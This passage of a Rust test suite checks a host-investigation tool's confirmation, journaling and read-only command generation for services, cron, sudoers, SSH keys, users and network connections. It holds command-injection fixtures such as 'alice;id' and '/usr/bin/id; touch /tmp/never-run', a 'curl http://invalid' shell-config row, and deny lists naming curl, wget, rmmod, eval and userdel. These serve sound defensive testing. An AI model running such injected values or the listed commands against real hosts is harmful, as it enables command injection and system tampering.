    async fn service_runtime_requires_exact_confirmation_and_unchanged_snapshot() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tinactive\tdead\tOpenSSH",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Start)
            .unwrap();
        harness.set_execute_output(service_snapshot("inactive", "dead", "enabled", 0, true));
        let wrong_plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_service_runtime(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([
            service_snapshot("inactive", "dead", "enabled", 0, true),
            service_snapshot("active", "running", "enabled", 456, true),
        ]);
        let stale = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_service_runtime(
                    &session,
                    stale,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn exact_service_runtime_is_journaled_and_readback_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tinactive\tdead\tOpenSSH",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Start)
            .unwrap();
        harness.set_execute_outputs([
            service_snapshot("inactive", "dead", "enabled", 0, true),
            service_snapshot("inactive", "dead", "enabled", 0, true),
            String::new(),
            service_snapshot("active", "running", "enabled", 456, true),
        ]);
        let plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().dangerous);
        assert!(plan.definition().restore_description.is_none());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_service_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert_eq!(outcome.unit, "sshd.service");
        assert!(outcome.verification.passed);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-service")
        );
    }

    #[tokio::test]
    async fn timer_mask_is_planned_journaled_and_readback_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Timers, 1).unwrap(),
            "logrotate.timer\tnext\tleft\tlast\tlogrotate.service",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Mask)
            .unwrap();
        harness.set_execute_outputs([
            service_snapshot("inactive", "dead", "disabled", 0, false),
            service_snapshot("inactive", "dead", "disabled", 0, false),
            String::new(),
            service_snapshot("inactive", "dead", "masked", 0, false),
        ]);
        let plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().dangerous);
        assert!(plan.definition().restore_description.is_some());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_service_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert_eq!(outcome.unit, "logrotate.timer");
        assert_eq!(outcome.action, ServiceRuntimeAction::Mask);
        assert!(outcome.verification.passed);
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn service_unit_file_change_restores_exact_prior_state_after_failed_readback() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tactive\trunning\tOpenSSH",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Enable)
            .unwrap();
        let disabled = service_snapshot("active", "running", "disabled", 456, true);
        harness.set_execute_output(disabled.clone());
        harness.set_execute_outputs([disabled.clone(), disabled.clone(), String::new()]);
        let plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().restore_description.is_some());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_service_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(!outcome.verification.passed);
        assert!(outcome.restored_after_failed_verification);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 3);
        assert_eq!(
            entries.last().unwrap().phase,
            crate::operations::JournalPhase::Restored
        );
    }

    fn user_table() -> SystemInfoTable {
        parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
            "alice\t1000\t1000\t/home/alice\t/bin/bash",
        )
    }

    fn login_table(source: &str) -> SystemInfoTable {
        parse_table(
            &SystemInfoRequest::new(SystemInfoTab::LoginHistory, 1).unwrap(),
            &format!("alice\tpts/0\t{source}\t2026-08-12 10:00:00\tlogin"),
        )
    }

    fn user_snapshot(uid: u32, state: &str) -> String {
        format!("alice\t{uid}\t1000\t/home/alice\t/bin/bash\t{state}\toperator")
    }

    #[test]
    fn package_kernel_and_environment_catalogs_are_closed_read_only_and_typed() {
        let packages = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Packages, 1).unwrap(),
            "openssl\t3.0.0\t2026-08-12\tdpkg",
        );
        let package_row = packages.rows[0].id.clone();
        assert_eq!(PackageInvestigationAction::ALL.len(), 8);
        for action in PackageInvestigationAction::ALL {
            let request = packages
                .artifact_investigation_request(
                    &package_row,
                    ArtifactInvestigationAction::Package(action),
                )
                .unwrap();
            let command = request.command().unwrap();
            assert!(command.contains("p='openssl'"), "{action:?}: {command}");
            for forbidden in [
                "apt-mark hold",
                "apt changelog",
                "curl ",
                "wget ",
                "rpm -e \"$p\"",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }
        assert!(
            packages
                .artifact_investigation_request(
                    &package_row,
                    ArtifactInvestigationAction::KernelModule(
                        KernelModuleInvestigationAction::Info,
                    ),
                )
                .is_err()
        );

        let modules = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 1).unwrap(),
            "nf_conntrack\t1234\t2\tnormal",
        );
        let module_row = modules.rows[0].id.clone();
        assert_eq!(KernelModuleInvestigationAction::ALL.len(), 8);
        for action in KernelModuleInvestigationAction::ALL {
            let command = modules
                .artifact_investigation_request(
                    &module_row,
                    ArtifactInvestigationAction::KernelModule(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(
                command.contains("m='nf_conntrack'"),
                "{action:?}: {command}"
            );
            for forbidden in ["rmmod", "modprobe -r", ">> /etc/modprobe", "blacklist "] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }

        let environment = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::EnvVars, 2).unwrap(),
            "PATH\t/usr/bin:/bin\tnormal\nTOKEN\tattacker; id\twarning",
        );
        assert_eq!(EnvVarInvestigationAction::ALL.len(), 4);
        let path_row = environment.rows[0].id.clone();
        for action in EnvVarInvestigationAction::ALL {
            let command = environment
                .artifact_investigation_request(
                    &path_row,
                    ArtifactInvestigationAction::Environment(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("n='PATH'"), "{action:?}: {command}");
            assert!(!command.contains("su -"));
        }
        assert!(
            environment
                .artifact_investigation_request(
                    &environment.rows[1].id,
                    ArtifactInvestigationAction::Environment(
                        EnvVarInvestigationAction::PathDirectories,
                    ),
                )
                .is_err()
        );
        for forged in ["A;id", "A=B", "--help", "变量"] {
            let table = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::EnvVars, 1).unwrap(),
                &format!("{forged}\tvalue\twarning"),
            );
            assert!(
                table
                    .artifact_investigation_request(
                        &table.rows[0].id,
                        ArtifactInvestigationAction::Environment(
                            EnvVarInvestigationAction::TraceSource,
                        ),
                    )
                    .is_err()
            );
        }
    }

    #[test]
    fn persistence_artifact_catalogs_replace_legacy_read_actions_without_mutation_surface() {
        let assert_read_only = |command: &str| {
            for forbidden in [
                "systemctl enable ",
                "systemctl disable ",
                "systemctl start ",
                "systemctl stop ",
                "systemctl mask ",
                "chmod ",
                "chown ",
                "rm --",
                "mv --",
                "cp --",
                "crontab -",
                "eval ",
                "sh -c \"$cmd\"",
                "bash -c \"$cmd\"",
            ] {
                assert!(!command.contains(forbidden), "found {forbidden}: {command}");
            }
        };

        let startup = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Autostart, 1).unwrap(),
            "sshd.service\tsshd.service\tenabled\tsystemd",
        );
        assert_eq!(StartupInvestigationAction::ALL.len(), 18);
        for action in StartupInvestigationAction::ALL {
            let request = startup
                .artifact_investigation_request(
                    &startup.rows[0].id,
                    ArtifactInvestigationAction::Startup(action),
                )
                .unwrap();
            assert_eq!(request.action().tab(), SystemInfoTab::Autostart);
            let command = request.command().unwrap();
            assert!(command.contains("u='sshd.service'"));
            assert_read_only(&command);
        }

        let cron_command = "/usr/bin/id; touch /tmp/never-run";
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 1).unwrap(),
            &format!("root\t*/5 * * * *\t{cron_command}\t/etc/cron.d/audit"),
        );
        assert_eq!(cron.columns, ["用户", "时间表", "命令", "来源"]);
        assert_eq!(CronInvestigationAction::ALL.len(), 15);
        for action in CronInvestigationAction::ALL {
            let command = cron
                .artifact_investigation_request(
                    &cron.rows[0].id,
                    ArtifactInvestigationAction::Cron(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("cmd='/usr/bin/id; touch /tmp/never-run'"));
            assert!(!command.contains("; /usr/bin/id"));
            assert_read_only(&command);
        }

        let timer = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Timers, 1).unwrap(),
            "logrotate.timer\t2026-08-13 01:00\t1h\t2026-08-12 01:00\tlogrotate.service",
        );
        assert_eq!(TimerInvestigationAction::ALL.len(), 6);
        for action in TimerInvestigationAction::ALL {
            let command = timer
                .artifact_investigation_request(
                    &timer.rows[0].id,
                    ArtifactInvestigationAction::Timer(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("t='logrotate.timer'"));
            assert!(command.contains("g='logrotate.service'"));
            assert_read_only(&command);
        }

        let shell = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 1).unwrap(),
            "/root/.bashrc\troot\t1723500000\t12\tcurl http://invalid\twarning",
        );
        assert_eq!(ShellConfigInvestigationAction::ALL.len(), 6);
        for action in ShellConfigInvestigationAction::ALL {
            let command = shell
                .artifact_investigation_request(
                    &shell.rows[0].id,
                    ArtifactInvestigationAction::ShellConfig(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("p='/root/.bashrc'"));
            assert!(command.contains("line=12"));
            assert_read_only(&command);
        }

        let sudoers = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Sudoers, 1).unwrap(),
            "alice\tALL\talice ALL=(ALL) NOPASSWD: ALL\tyes\t/etc/sudoers.d/alice",
        );
        assert_eq!(SudoersInvestigationAction::ALL.len(), 8);
        for action in SudoersInvestigationAction::ALL {
            let command = sudoers
                .artifact_investigation_request(
                    &sudoers.rows[0].id,
                    ArtifactInvestigationAction::Sudoers(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("user='alice'"));
            assert!(command.contains("src='/etc/sudoers.d/alice'"));
            assert_read_only(&command);
        }

        let suid = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SuidFiles, 1).unwrap(),
            "/usr/bin/passwd\t4755\troot\t68208\t2026-08-12T00:00:00\tnormal",
        );
        assert_eq!(SuidFileInvestigationAction::ALL.len(), 8);
        for action in SuidFileInvestigationAction::ALL {
            let command = suid
                .artifact_investigation_request(
                    &suid.rows[0].id,
                    ArtifactInvestigationAction::SuidFile(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("p='/usr/bin/passwd'"));
            assert_read_only(&command);
        }

        let ssh_keys = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SshKeys, 1).unwrap(),
            "alice\tssh-ed25519\tAAAAC3NzaC1lZDI1NTE5AAAAIGhvc3RpbGVrZXlkYXRh\toperator\t/home/alice/.ssh/authorized_keys",
        );
        assert_eq!(SshKeyInvestigationAction::ALL.len(), 7);
        for action in SshKeyInvestigationAction::ALL {
            let command = ssh_keys
                .artifact_investigation_request(
                    &ssh_keys.rows[0].id,
                    ArtifactInvestigationAction::SshKey(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("owner='alice'"));
            assert!(command.contains("f='/home/alice/.ssh/authorized_keys'"));
            assert!(!command.contains("id_rsa"));
            assert_read_only(&command);
        }
    }

    #[test]
    fn persistence_artifact_identities_reject_forged_units_paths_schedules_and_principals() {
        let rejected = [
            (
                SystemInfoTab::Autostart,
                "evil.service;id\tevil\tenabled\tsystemd",
                ArtifactInvestigationAction::Startup(StartupInvestigationAction::Details),
            ),
            (
                SystemInfoTab::Cron,
                "root\t* * * * *;id\t/usr/bin/id\t/etc/cron.d/audit",
                ArtifactInvestigationAction::Cron(CronInvestigationAction::Details),
            ),
            (
                SystemInfoTab::Cron,
                "root\t* * * * *\t/usr/bin/id\t/etc/passwd",
                ArtifactInvestigationAction::Cron(CronInvestigationAction::Details),
            ),
            (
                SystemInfoTab::Timers,
                "evil.timer;id\tnext\tleft\tlast\tevil.service",
                ArtifactInvestigationAction::Timer(TimerInvestigationAction::TimerStatus),
            ),
            (
                SystemInfoTab::ShellConfigs,
                "/tmp/profile\troot\t0\t1\tvalue\twarning",
                ArtifactInvestigationAction::ShellConfig(ShellConfigInvestigationAction::ViewFile),
            ),
            (
                SystemInfoTab::Sudoers,
                "alice;id\tALL\tline\tno\t/etc/sudoers",
                ArtifactInvestigationAction::Sudoers(SudoersInvestigationAction::ViewSource),
            ),
            (
                SystemInfoTab::SuidFiles,
                "relative/path\t4755\troot\t1\tnow\thigh",
                ArtifactInvestigationAction::SuidFile(SuidFileInvestigationAction::Details),
            ),
            (
                SystemInfoTab::SshKeys,
                "root\tssh-ed25519\tAAAAC3NzaC1lZDI1NTE5AAAAIGhvc3RpbGVrZXlkYXRh\tbad\t/root/.ssh/id_rsa",
                ArtifactInvestigationAction::SshKey(SshKeyInvestigationAction::Fingerprint),
            ),
        ];
        for (tab, row, action) in rejected {
            let table = parse_table(&SystemInfoRequest::new(tab, 1).unwrap(), row);
            assert!(
                table
                    .artifact_investigation_request(&table.rows[0].id, action)
                    .is_err(),
                "accepted forged {tab:?} row"
            );
        }

        let group = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Sudoers, 1).unwrap(),
            "%wheel\tALL\t%wheel ALL=(ALL) ALL\tno\t/etc/sudoers",
        );
        assert!(
            group
                .artifact_investigation_request(
                    &group.rows[0].id,
                    ArtifactInvestigationAction::Sudoers(SudoersInvestigationAction::ViewSource,),
                )
                .is_ok()
        );
        assert!(
            group
                .artifact_investigation_request(
                    &group.rows[0].id,
                    ArtifactInvestigationAction::Sudoers(SudoersInvestigationAction::UserGroups,),
                )
                .is_err()
        );
    }

    #[tokio::test]
    async fn artifact_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 1).unwrap(),
            "nf_conntrack\t1234\t2\tnormal",
        );
        let request = table
            .artifact_investigation_request(
                &table.rows[0].id,
                ArtifactInvestigationAction::KernelModule(KernelModuleInvestigationAction::Dmesg),
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>remote</script>\n{}",
            "界".repeat(MAX_ARTIFACT_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_artifact(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>remote</script>"));
        assert!(result.output.len() <= MAX_ARTIFACT_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_artifact(&session, &request)
                .await
                .is_err()
        );
    }

    #[test]
    fn user_catalog_replaces_all_twenty_legacy_read_actions_without_mutation_tokens() {
        assert_eq!(UserInvestigationGroup::ALL.len(), 6);
        assert_eq!(UserInvestigationAction::ALL.len(), 20);
        let table = user_table();
        let row_id = table.rows[0].id.clone();
        let identity = table.user_identity(&row_id).unwrap();
        assert_eq!(identity.username, "alice");
        assert_eq!(identity.uid, 1000);
        assert_eq!(identity.home, "/home/alice");

        for action in UserInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(UserInvestigationGroup::ALL.contains(&action.group()));
            let request = table.user_investigation_request(&row_id, action).unwrap();
            let command = request.command();
            assert!(command.contains("u='alice'"), "{action:?}: {command}");
            for forbidden in [
                "passwd -l",
                "passwd -u",
                "userdel",
                "pkill",
                "sed -i",
                "iptables",
                "nft add",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }

        for row in [
            "alice;id\t1000\t1000\t/home/alice\t/bin/bash",
            "alice\t1000\t1000\trelative/home\t/bin/bash",
            "alice\tnan\t1000\t/home/alice\t/bin/bash",
        ] {
            let forged = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
                row,
            );
            assert!(forged.user_identity(&forged.rows[0].id).is_err());
        }
    }

    #[test]
    fn login_catalog_is_typed_and_source_actions_require_a_real_ip_address() {
        assert_eq!(LoginInvestigationGroup::ALL.len(), 3);
        assert_eq!(LoginInvestigationAction::ALL.len(), 10);
        let table = login_table("203.0.113.9");
        let row_id = table.rows[0].id.clone();
        let identity = table.login_identity(&row_id).unwrap();
        assert_eq!(identity.username, "alice");
        assert_eq!(identity.source, Some("203.0.113.9".parse().unwrap()));
        for action in LoginInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(LoginInvestigationGroup::ALL.contains(&action.group()));
            let request = table.login_investigation_request(&row_id, action).unwrap();
            let command = request.command().unwrap();
            for forbidden in ["iptables", "nft add", "passwd -l", "userdel", "pkill"] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
            assert_eq!(
                command.contains("User no longer exists"),
                action.requires_current_user(),
                "historical source/global probes must remain usable after account deletion: {action:?}: {command}",
            );
        }

        let local = login_table("0.0.0.0");
        assert!(
            local
                .login_investigation_request(
                    &local.rows[0].id,
                    LoginInvestigationAction::UserDetails,
                )
                .is_ok()
        );
        assert!(
            local
                .login_investigation_request(&local.rows[0].id, LoginInvestigationAction::Whois,)
                .is_err()
        );
        for source in ["203.0.113.9;id", "--help", "host.example"] {
            let forged = login_table(source);
            assert!(forged.login_identity(&forged.rows[0].id).is_err());
        }
    }

    #[tokio::test]
    async fn user_and_login_investigations_are_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let users = user_table();
        let user_request = users
            .user_investigation_request(&users.rows[0].id, UserInvestigationAction::SuspiciousFiles)
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_USER_INVESTIGATION_CHARS)
        ));
        let user_result = services
            .system_info()
            .investigate_user(&session, &user_request)
            .await
            .unwrap();
        assert!(user_result.output.starts_with("<script>alert(1)</script>"));
        assert!(user_result.output.len() <= MAX_USER_INVESTIGATION_CHARS);
        assert!(user_result.truncated);

        let logins = login_table("203.0.113.9");
        let login_request = logins
            .login_investigation_request(&logins.rows[0].id, LoginInvestigationAction::AuthLogs)
            .unwrap();
        harness.set_execute_output("remote <b>text</b>".repeat(20_000));
        let login_result = services
            .system_info()
            .investigate_login(&session, &login_request)
            .await
            .unwrap();
        assert!(login_result.output.starts_with("remote <b>text</b>"));
        assert!(login_result.output.len() <= MAX_LOGIN_INVESTIGATION_CHARS);
        assert!(login_result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_user(&session, &user_request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn account_lock_requires_exact_confirmation_and_unchanged_snapshot() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = user_table();
        let request = table
            .user_account_request(&table.rows[0].id, UserAccountAction::Lock)
            .unwrap();
        harness.set_execute_output(user_snapshot(1000, "P"));
        let wrong_plan = services
            .system_info()
            .plan_user_account(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_user_account(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([user_snapshot(1000, "P"), user_snapshot(1001, "P")]);
        let stale = services
            .system_info()
            .plan_user_account(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_user_account(&session, stale, confirmation, services.operation_journal(),)
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn account_lock_and_unlock_are_journaled_and_readback_verified() {
        for (action, before, after) in [
            (UserAccountAction::Lock, "P", "L"),
            (UserAccountAction::Unlock, "L", "P"),
        ] {
            let root = TestRoot::new();
            let (services, session, harness) = bound_services(&root).await;
            let table = user_table();
            let request = table
                .user_account_request(&table.rows[0].id, action)
                .unwrap();
            harness.set_execute_outputs([
                user_snapshot(1000, before),
                user_snapshot(1000, before),
                String::new(),
                user_snapshot(1000, after),
            ]);
            let plan = services
                .system_info()
                .plan_user_account(&session, &request)
                .await
                .unwrap();
            assert!(plan.definition().restore_description.is_some());
            let confirmation = DangerousConfirmation::approve(plan.definition());
            let outcome = services
                .system_info()
                .execute_user_account(&session, plan, confirmation, services.operation_journal())
                .await
                .unwrap();
            assert!(outcome.verification.passed);
            assert!(!outcome.restored_after_failed_verification);
            let entries = services.operation_journal().entries().unwrap();
            assert_eq!(entries.len(), 2);
            assert!(
                entries
                    .iter()
                    .all(|entry| entry.source == "system-info-user")
            );
        }
    }

    fn network_table() -> SystemInfoTable {
        parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Network, 1).unwrap(),
            "tcp\t10.0.0.1:50000\t203.0.113.8:443\tESTAB\t123\tusers:((sshd,pid=123,fd=4))",
        )
    }

    fn network_snapshot(process: &str) -> String {
        format!("10.0.0.1:50000\t203.0.113.8:443\tESTAB\t{process}")
    }

    #[test]
    fn network_catalog_replaces_every_legacy_read_action_with_typed_endpoints() {
        assert_eq!(NetworkInvestigationGroup::ALL.len(), 6);
        assert_eq!(NetworkInvestigationAction::ALL.len(), 19);
        let table = network_table();
        let row_id = table.rows[0].id.clone();
        let identity = table.network_identity(&row_id).unwrap();
        assert_eq!(identity.transport, NetworkTransport::Tcp);
        assert_eq!(identity.local.as_ref().unwrap().port, Some(50_000));
        assert_eq!(
            identity.remote.as_ref().unwrap().address,
            "203.0.113.8".parse::<IpAddr>().unwrap()
        );
        assert_eq!(identity.remote.as_ref().unwrap().port, Some(443));

        for action in NetworkInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(NetworkInvestigationGroup::ALL.contains(&action.group()));
            let request = table
                .network_investigation_request(&row_id, action)
                .unwrap();
            let command = request.command().unwrap();
            for forbidden in [
                "ss -K",
                "iptables -A",
                "iptables -D",
                "nft add",
                "curl http",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }
        let disconnect = table.network_disconnect_request(&row_id).unwrap();
        let command = network_disconnect_command(disconnect.identity()).unwrap();
        assert!(command.contains("ss -K src"));
        assert!(command.contains("lip='10.0.0.1'"));
        assert!(command.contains("rip='203.0.113.8'"));
    }

    #[test]
    fn network_identity_handles_ipv6_open_ports_and_rejects_hostile_or_wildcard_peers() {
        let established = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Established, 1).unwrap(),
            "[2001:db8::1]:50000\t[2001:db8::2]:443\t443\t123\tsshd\troot",
        );
        let identity = established
            .network_identity(&established.rows[0].id)
            .unwrap();
        assert!(matches!(
            identity.remote.as_ref().unwrap().address,
            IpAddr::V6(_)
        ));
        assert_eq!(identity.remote.as_ref().unwrap().port, Some(443));

        let listening = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::OpenPorts, 1).unwrap(),
            "tcp\t::\t22\t123\tsshd\troot",
        );
        let identity = listening.network_identity(&listening.rows[0].id).unwrap();
        assert_eq!(identity.local.as_ref().unwrap().port, Some(22));
        assert!(
            listening
                .network_investigation_request(
                    &listening.rows[0].id,
                    NetworkInvestigationAction::PortProcess,
                )
                .is_ok()
        );
        assert!(
            listening
                .network_investigation_request(
                    &listening.rows[0].id,
                    NetworkInvestigationAction::Whois,
                )
                .is_err()
        );

        for remote in ["203.0.113.8;id:443", "--help:443"] {
            let forged = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Network, 1).unwrap(),
                &format!("tcp\t10.0.0.1:50000\t{remote}\tESTAB\t1\tsshd"),
            );
            assert!(forged.network_identity(&forged.rows[0].id).is_err());
        }

        let wildcard = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Network, 1).unwrap(),
            "udp\t0.0.0.0:68\t*:*\tUNCONN\t1\tdhclient",
        );
        let wildcard_identity = wildcard.network_identity(&wildcard.rows[0].id).unwrap();
        assert!(wildcard_identity.remote.is_none());
        assert!(
            wildcard
                .network_investigation_request(
                    &wildcard.rows[0].id,
                    NetworkInvestigationAction::Whois,
                )
                .is_err()
        );
    }

    #[test]
    fn network_snapshot_parser_is_strict_and_process_text_is_hashed() {
        let parsed =
            parse_network_snapshot(&network_snapshot("<script>remote()</script>")).unwrap();
        assert_eq!(parsed.local_display, "10.0.0.1:50000");
        assert_eq!(parsed.remote_display, "203.0.113.8:443");
        assert_eq!(parsed.process_sha256.len(), 64);
        assert!(!parsed.process_sha256.contains("script"));
        for invalid in [
            "10.0.0.1;id:1\t203.0.113.8:443\tESTAB\tsshd",
            "10.0.0.1:1\t203.0.113.8:443\tBAD\nSTATE\tsshd",
            "ABSENT",
        ] {
            assert!(parse_network_snapshot(invalid).is_err());
        }
    }

    #[tokio::test]
    async fn network_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = network_table();
        let request = table
            .network_investigation_request(
                &table.rows[0].id,
                NetworkInvestigationAction::SecurityLogs,
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_NETWORK_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_network(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>alert(1)</script>"));
        assert!(result.output.len() <= MAX_NETWORK_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_network(&session, &request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn network_disconnect_requires_exact_confirmation_and_unchanged_connection() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = network_table();
        let request = table.network_disconnect_request(&table.rows[0].id).unwrap();
        harness.set_execute_output(network_snapshot("sshd"));
        let wrong_plan = services
            .system_info()
            .plan_network_disconnect(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_network_disconnect(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([network_snapshot("sshd"), network_snapshot("reused")]);
        let stale = services
            .system_info()
            .plan_network_disconnect(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_network_disconnect(
                    &session,
                    stale,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn exact_network_disconnect_is_journaled_and_readback_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = network_table();
        let request = table.network_disconnect_request(&table.rows[0].id).unwrap();
        harness.set_execute_outputs([
            network_snapshot("sshd"),
            network_snapshot("sshd"),
            String::new(),
            "ABSENT".to_owned(),
        ]);
        let plan = services
            .system_info()
            .plan_network_disconnect(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().restore_description.is_none());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_network_disconnect(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-network")
        );
    }

    #[test]
    fn artifact_mutations_are_closed_to_managed_rows_and_paths() {
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 8).unwrap(),
            "root\t* * * * *\t/usr/bin/true\t/etc/cron.d/lovely-job\nroot\t0 0 * * *\t/usr/bin/true\t/etc/crontab",
        );
        assert!(
            cron.artifact_mutation_request(
                &cron.rows[0].id,
                ArtifactMutationAction::DeleteCronFile,
            )
            .is_ok()
        );
        assert!(
            cron.artifact_mutation_request(
